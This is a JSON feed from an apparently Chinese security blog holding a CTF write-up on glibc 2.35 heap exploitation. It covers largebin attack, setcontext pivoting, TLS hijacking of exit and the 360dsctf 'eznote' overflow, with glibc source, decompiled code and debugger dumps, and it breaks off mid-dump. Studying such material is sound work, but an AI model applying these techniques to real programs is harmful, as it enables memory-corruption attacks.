{
    "version": "https://jsonfeed.org/version/1",
    "title": "我他喵的 • All posts by \"pwn\" tag",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/",
            "url": "http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/",
            "title": "glibc-2.35一些手法",
            "date_published": "2022-08-01T08:24:13.000Z",
            "content_html": "<h1 id=\"glibc-235-ubuntu3-下的利用手法\"><a class=\"markdownIt-Anchor\" href=\"#glibc-235-ubuntu3-下的利用手法\">#</a> glibc 2.35 ubuntu3 下的利用手法。</h1>\n<p>原本我们以为 2.35 的时代不会来的这么快，但是最近 DS360ctf，以及强网杯几道题目的出现让 glibc 的 pwn 生存条件急剧下降。</p>\n<p>首先我们谈谈为什么很多师傅都人为 2.35 的堆 pwn 是一个寒冬：</p>\n<h2 id=\"现状\"><a class=\"markdownIt-Anchor\" href=\"#现状\">#</a> 现状：</h2>\n<p>之所以这样讲，一部分原因在于由于高版本的 glibc 的安全特性，封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。但是这并不是让题目更难，觉得反而是解题出现严重的两级分化，一部分师傅研究过几个手法，几乎就可以做到一口气解决，因为利用的手法比较单一，就那么几种，即便是先提出的手法，其实原理也是大同小异。而对于不了解的师傅，就会陷入深渊，没有后门，或者自己习惯的后门都被堵上了，怎么走。</p>\n<p>我们发现，其实大部分的情况都都是因为 hook 被禁止。而最近出现的手法，就要求我们要继续挖掘 io 的利用链。</p>\n<p>所以这次我就要花费一些时间整理一部分。主要还是基于目前出现的一些题目的复现。</p>\n<p>** 在 35 时代，我们必须学会 largebinattack</p>\n<p>目前计划着是有</p>\n<ul>\n<li>house of apple 1</li>\n<li>house of apple 2</li>\n<li>house of apple 3</li>\n<li>house of cat</li>\n<li>house of emma</li>\n<li>house of banana</li>\n<li>tls 劫持</li>\n</ul>\n<h2 id=\"一些小总结\"><a class=\"markdownIt-Anchor\" href=\"#一些小总结\">#</a> 一些小总结：</h2>\n<p>目前遇到的 2.35 的题目都是基于同一个版本</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dreamcat@dreamcat-virtual-machine:~/Desktop/360dsctf/eznote$ strings libc.so.6 |grep ubuntu</span><br><span class=\"line\">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.</span><br><span class=\"line\">&lt;https://bugs.launchpad.net/ubuntu/+<span class=\"built_in\">source</span>/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>\n<h2 id=\"largebinattack\"><a class=\"markdownIt-Anchor\" href=\"#largebinattack\">#</a> largebinattack</h2>\n<p>关键代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             victim_index = largebin_index (size);                               <span class=\"comment\">//largebins</span></span><br><span class=\"line\">             bck = bin_at (av, victim_index);</span><br><span class=\"line\">             fwd = bck-&gt;fd;</span><br><span class=\"line\"></span><br><span class=\"line\">             <span class=\"comment\">/* maintain large bins in sorted order */</span></span><br><span class=\"line\">             <span class=\"keyword\">if</span> (fwd != bck)</span><br><span class=\"line\">               &#123;</span><br><span class=\"line\">                 <span class=\"comment\">/* Or with inuse bit to speed comparisons */</span></span><br><span class=\"line\">                 size |= PREV_INUSE;</span><br><span class=\"line\">                 <span class=\"comment\">/* if smaller than smallest, bypass loop below */</span></span><br><span class=\"line\">                 assert (chunk_main_arena (bck-&gt;bk));</span><br><span class=\"line\">                 <span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (size)</span><br><span class=\"line\">\t      &lt; (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class=\"line\">                   &#123;</span><br><span class=\"line\">                     fwd = bck;</span><br><span class=\"line\">                     bck = bck-&gt;bk;</span><br><span class=\"line\"></span><br><span class=\"line\">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class=\"line\">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class=\"line\">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">                 <span class=\"keyword\">else</span></span><br><span class=\"line\">                   &#123;</span><br><span class=\"line\">                     assert (chunk_main_arena (fwd));</span><br><span class=\"line\">                     <span class=\"keyword\">while</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class=\"line\">                       &#123;</span><br><span class=\"line\">                         fwd = fwd-&gt;fd_nextsize;</span><br><span class=\"line\">\t\t  assert (chunk_main_arena (fwd));</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                     <span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) size</span><br><span class=\"line\">\t\t  == (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) chunksize_nomask (fwd))</span><br><span class=\"line\">                       <span class=\"comment\">/* Always insert in the second position.  */</span></span><br><span class=\"line\">                       fwd = fwd-&gt;fd;</span><br><span class=\"line\">                     <span class=\"keyword\">else</span></span><br><span class=\"line\">                       &#123;</span><br><span class=\"line\">                         victim-&gt;fd_nextsize = fwd;</span><br><span class=\"line\">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class=\"line\">                         <span class=\"keyword\">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))                        <span class=\"comment\">//相比于2.29新增加的判断</span></span><br><span class=\"line\">                           malloc_printerr (<span class=\"string\">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class=\"line\">                         fwd-&gt;bk_nextsize = victim;</span><br><span class=\"line\">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\">                     bck = fwd-&gt;bk;</span><br><span class=\"line\">                     <span class=\"keyword\">if</span> (bck-&gt;fd != fwd)                               <span class=\"comment\">////相比于2.29新增加的判断</span></span><br><span class=\"line\">                       malloc_printerr (<span class=\"string\">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">             <span class=\"keyword\">else</span></span><br><span class=\"line\">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class=\"line\">           &#125;</span><br></pre></td></tr></table></figure>\n<p>相比于 2.29，新增加了两个检查。因为这些检查的原因，我们只有插入小 size 额可以实现 attack,</p>\n<h3 id=\"要求\"><a class=\"markdownIt-Anchor\" href=\"#要求\">#</a> 要求</h3>\n<ol>\n<li>对应的 bin 中只有一个 free_chunk,（此时 fd_nextsize,bk_nextsize 都指向自己）</li>\n<li>修改 free_chunk 的 bk_nextsize 为目标地址减去 0x20.</li>\n</ol>\n<h2 id=\"setcontext\"><a class=\"markdownIt-Anchor\" href=\"#setcontext\">#</a> setcontext</h2>\n<p>在新的版本中，setcontext 不再是直接使用 rdi，而是使用 rdx 进行参数的一些设置。所以需要一些手段在 setcontext 之前，能够设置 rdx 为可控制的堆空间。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  0x7f2c07abea6d &lt;setcontext+61&gt;     mov    rsp, qword ptr [rdx + 0xa0]</span><br><span class=\"line\">► 0x7f2c07abea74 &lt;setcontext+68&gt;     mov    rbx, qword ptr [rdx + 0x80]</span><br><span class=\"line\">  0x7f2c07abea7b &lt;setcontext+75&gt;     mov    rbp, qword ptr [rdx + 0x78]</span><br><span class=\"line\">  0x7f2c07abea7f &lt;setcontext+79&gt;     mov    r12, qword ptr [rdx + 0x48]</span><br><span class=\"line\">  0x7f2c07abea83 &lt;setcontext+83&gt;     mov    r13, qword ptr [rdx + 0x50]</span><br><span class=\"line\">  0x7f2c07abea87 &lt;setcontext+87&gt;     mov    r14, qword ptr [rdx + 0x58]</span><br><span class=\"line\">  0x7f2c07abea8b &lt;setcontext+91&gt;     mov    r15, qword ptr [rdx + 0x60]</span><br><span class=\"line\">  0x7f2c07abea8f &lt;setcontext+95&gt;     test   dword ptr fs:[0x48], 2</span><br><span class=\"line\">  0x7f2c07abea9b &lt;setcontext+107&gt;    je     setcontext+294                &lt;setcontext+294&gt;</span><br><span class=\"line\">   ↓</span><br><span class=\"line\">  0x7f2c07abeb56 &lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]</span><br><span class=\"line\">  0x7f2c07abeb5d &lt;setcontext+301&gt;    push   rcx</span><br><span class=\"line\">  0x7f2c07abeb5e &lt;setcontext+302&gt;\tmov    rsi,QWORD PTR [rdx+0x70]</span><br><span class=\"line\">  0x7f2c07abeb62 &lt;setcontext+306&gt;:\tmov    rdi,QWORD PTR [rdx+0x68]</span><br><span class=\"line\">  0x7f2c07abeb66 &lt;setcontext+310&gt;:\tmov    rcx,QWORD PTR [rdx+0x98]</span><br><span class=\"line\">  0x7f2c07abeb6d &lt;setcontext+317&gt;:\tmov    r8,QWORD PTR [rdx+0x28]</span><br><span class=\"line\">  0x7f2c07abeb71 &lt;setcontext+321&gt;:\tmov    r9,QWORD PTR [rdx+0x30]</span><br><span class=\"line\">  0x7f2c07abeb75 &lt;setcontext+325&gt;:\tmov    rdx,QWORD PTR [rdx+0x88]</span><br><span class=\"line\">  0x7f2c07abeb7c &lt;setcontext+332&gt;:\txor    eax,eax</span><br><span class=\"line\">  0x7f2c07abeb7e &lt;setcontext+334&gt;:\tret </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>rdx 我们提前布置为我们可以控制的堆上，保证 rbp 大于、等于 rsp。除了 rcx，其他寄存器直接设置为 0，这里单独提出来 rcx，是因为 setcontext 最后 ret 的时候相当于，mov rip,[rsp]。加一个 ret 后，就可以劫持程序栈 rip.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> RBP  <span class=\"number\">0x563dfde0ada0</span> —▸ <span class=\"number\">0x7f3391d8b3e5</span> (iconv+<span class=\"number\">197</span>) ◂— pop    rdi</span><br><span class=\"line\"> RSP  <span class=\"number\">0x563dfde0ad98</span> —▸ <span class=\"number\">0x7f3391db4b52</span> (setcontext+<span class=\"number\">290</span>) ◂— ret    </span><br><span class=\"line\">*RIP  <span class=\"number\">0x7f3391db4b7e</span> (setcontext+<span class=\"number\">334</span>) ◂— ret    </span><br><span class=\"line\">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b66</span> &lt;setcontext+<span class=\"number\">310</span>&gt;    mov    rcx, qword ptr [rdx + <span class=\"number\">0x98</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b6d</span> &lt;setcontext+<span class=\"number\">317</span>&gt;    mov    r8, qword ptr [rdx + <span class=\"number\">0x28</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b71</span> &lt;setcontext+<span class=\"number\">321</span>&gt;    mov    r9, qword ptr [rdx + <span class=\"number\">0x30</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b75</span> &lt;setcontext+<span class=\"number\">325</span>&gt;    mov    rdx, qword ptr [rdx + <span class=\"number\">0x88</span>]</span><br><span class=\"line\">   <span class=\"number\">0x7f3391db4b7c</span> &lt;setcontext+<span class=\"number\">332</span>&gt;    xor    eax, eax</span><br><span class=\"line\"> ► <span class=\"number\">0x7f3391db4b7e</span> &lt;setcontext+<span class=\"number\">334</span>&gt;    ret </span><br></pre></td></tr></table></figure>\n<p>我们的 rbp 设置为 rop 的开始而不是在下一条。但是我还没有搞清楚是否可以用 leave;ret; 浅尝了一下，不可以</p>\n<h2 id=\"tls劫持exit执行流\"><a class=\"markdownIt-Anchor\" href=\"#tls劫持exit执行流\">#</a> tls 劫持 exit 执行流</h2>\n<h3 id=\"前提条件\"><a class=\"markdownIt-Anchor\" href=\"#前提条件\">#</a> 前提条件</h3>\n<ul>\n<li>任意地址写一个堆地址，</li>\n<li>泄露出 heap 地址，libc 地址</li>\n<li>我们可以改写一个 chunk 的头部信息，prev_size,size。</li>\n<li>程序可以执行 exit（这里我们仅仅测试了 main 函数直接 retutrn, 显式调用 exit 应该也可以，或者报错）</li>\n</ul>\n<h3 id=\"这里我们以360dsctf的eznote为例题\"><a class=\"markdownIt-Anchor\" href=\"#这里我们以360dsctf的eznote为例题\">#</a> 这里我们以 360dsctf 的 eznote 为例题，</h3>\n<p>程序实现了基本的增删改查，程序初始化的时候，申请了一个 chunk 用作一个指针数组，用于储存我们申请的 note.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">init_0</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stderr</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  alarm(<span class=\"number\">0x78</span>u);</span><br><span class=\"line\">  gp = (global_list *)<span class=\"built_in\">calloc</span>(<span class=\"number\">7uLL</span>, <span class=\"number\">0x18</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里储存的结构体的大小为 0x18 字节，gp 一共申请了 7 个。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00000000</span> note            struc ; (<span class=\"keyword\">sizeof</span>=<span class=\"number\">0x18</span>, mappedto_15)</span><br><span class=\"line\"><span class=\"number\">00000000</span>                                         ; XREF: global_list/r</span><br><span class=\"line\"><span class=\"number\">00000000</span> size            dq ?                    ; XREF: add+<span class=\"number\">28</span>/r</span><br><span class=\"line\"><span class=\"number\">00000008</span> ptr             dq ?                    ; offset</span><br><span class=\"line\"><span class=\"number\">00000010</span> real_size       dq ?</span><br><span class=\"line\"><span class=\"number\">00000018</span> note            ends</span><br><span class=\"line\"><span class=\"number\">00000018</span></span><br></pre></td></tr></table></figure>\n<p>size 是我们在申请 chunk 的时候提供的，real_size 是我们输入的数据的长度。</p>\n<p>问题出在 add 的时候，同时存在的 note 的数量判断。这里值判断是否大于 7，所以我们申请第 8 个的时候，可以通过检查，那么就造成了数组的御姐，数组储存在 chunk 中，势必会影响下一个 chunk 的头部数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 count; <span class=\"comment\">// rbp</span></span><br><span class=\"line\">  __int64 v1; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  __int64 size; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// r12</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *ptr; <span class=\"comment\">// r13</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *real_size; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  note *v6; <span class=\"comment\">// rbx</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">unsigned</span> __int64)nums &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Too many notes.&quot;</span>);</span><br><span class=\"line\">  count = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  v1 = <span class=\"number\">1LL</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( gp-&gt;<span class=\"built_in\">list</span>[<span class=\"number\">0</span>].ptr )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++count;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !gp-&gt;<span class=\"built_in\">list</span>[v1].ptr || count == <span class=\"number\">7</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      ++v1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v1 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Size: &quot;</span>);</span><br><span class=\"line\">  size = getnum();</span><br><span class=\"line\">  v3 = size;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size &lt;= <span class=\"number\">0x3FF</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid size.&quot;</span>);</span><br><span class=\"line\">  ptr = (<span class=\"type\">char</span> *)<span class=\"built_in\">calloc</span>(size, <span class=\"number\">1uLL</span>);</span><br><span class=\"line\">  __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Content: &quot;</span>);</span><br><span class=\"line\">  real_size = read_n(<span class=\"number\">0</span>, ptr, v3);</span><br><span class=\"line\">  v6 = &amp;gp-&gt;<span class=\"built_in\">list</span>[v1];</span><br><span class=\"line\">  v6-&gt;size = v3;</span><br><span class=\"line\">  ++nums;</span><br><span class=\"line\">  v6-&gt;ptr = ptr;</span><br><span class=\"line\">  v6-&gt;real_size = (__int64)real_size;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __printf_chk(<span class=\"number\">1LL</span>, <span class=\"string\">&quot;Note%lu saved.\\n&quot;</span>, count);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>数组最小限制为 0x400, 没有上限，所以我们可以尽情的构造较大的 chunk。</p>\n<p>观察到，数组溢出时候的情况。因为我们申请 gp 数组的堆块大小只有 0xb0, 实际使用空间只有 0xa8, 那么，我们申请的 7 个结构体恰好可以沾满，那么第 8 个结构体的 size 就会占据下一个 chunk 的头部，修改 chunk_size。如果我们前面的 chunk 申请的比较小，第八个申请的很大，就会导致第一个 chunk 的 size 被更改，实现 overlap。</p>\n<p>主义的时，一旦 8 号 chunk 申请处理啊，就无法 free。</p>\n<p>泄露地址。</p>\n<p>在向 note 中读入数据的时候，会自动补全空字符。输出使用格式化字符串，只是 add 时使用了 calloc，初始化 chunk。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> *__fastcall <span class=\"title function_\">read_n</span><span class=\"params\">(<span class=\"type\">int</span> fd, <span class=\"type\">char</span> *ptr, __int64 size)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> *v3; <span class=\"comment\">// r14</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *pos; <span class=\"comment\">// r15</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// rbx</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *end; <span class=\"comment\">// r13</span></span><br><span class=\"line\">  __int64 v7; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf; <span class=\"comment\">// [rsp+17h] [rbp-41h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v11; <span class=\"comment\">// [rsp+18h] [rbp-40h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = ptr;</span><br><span class=\"line\">  v11 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  buf = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( size )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    pos = ptr;</span><br><span class=\"line\">    v5 = <span class=\"number\">1LL</span> - (_QWORD)ptr;</span><br><span class=\"line\">    end = &amp;ptr[size];</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v7 = (__int64)&amp;pos[v5];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( read(fd, &amp;buf, <span class=\"number\">1uLL</span>) &lt;= <span class=\"number\">0</span> || buf == <span class=\"number\">10</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      *pos++ = buf;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( pos == end )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_8;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *pos = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">LABEL_8:</span><br><span class=\"line\">    v3[size - <span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">    v7 = size;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">char</span> *)v7;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>修改掉第一个 notechunk 的 size 后，直接将其 free，就会将第二个覆盖到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">28</span>gx <span class=\"number\">0x5572d1a52290</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52290</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00000000000000b1</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522a0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522b0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522c0</span>:\t<span class=\"number\">0x00005572d1a52770</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522d0</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x00005572d1a52b90</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522e0</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a522f0</span>:\t<span class=\"number\">0x00005572d1a52fb0</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52300</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x00005572d1a533d0</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52310</span>:\t<span class=\"number\">0x0000000000000418</span>\t<span class=\"number\">0x0000000000000418</span></span><br><span class=\"line\"><span class=\"number\">0x5572d1a52320</span>:\t<span class=\"number\">0x00005572d1a537f0</span>\t<span 